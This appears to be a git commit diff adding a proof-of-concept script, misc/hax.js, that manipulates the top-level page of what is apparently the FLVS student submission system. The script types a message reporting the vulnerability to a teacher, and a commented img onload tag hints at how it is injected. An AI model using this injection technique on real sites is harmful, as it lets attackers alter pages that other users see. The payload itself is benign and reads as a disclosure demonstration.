368679da74b49f7a86d9af8119cb05c1684f90f3
xacer <chacecaven@outlook.com>
2021-10-28 14:34:38 -0400

    Hax 4

--- misc/hax.js
+++ misc/hax.js
@@ -1,4 +1,25 @@
 
-console.log("Hax run");
+// <img onload="" width="1px" height="1px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwJt3NP0PTKrWSYtcxWlTcK5H7plhdwe9B6g&usqp=CAU" >
 
-window.location = "https://xacer.dev/";
+const doc = window.top.document;
+
+const textArea = doc.querySelector("textarea[dir=\"ltr\"]");
+
+const message = "Hello Mrs. Rakestraw. I have found a strange vulnerability in FLVS's student submission system.";
+
+let idx = 1;
+
+let interval = setInterval(() => {
+
+    const normalMessage = idx>0?message.substr(0, idx):"";
+
+    // const highlightedCharacter = message[idx];
+    // const textHTML = "<p>" + normalMessage + "<span style=\"background-color: green\">" + highlightedCharacter + "</span></p>";
+
+    textArea.innerHTML = normalMessage;
+
+    idx ++;
+
+    if (idx >= message.length) clearInterval(interval);
+
+}, 500);
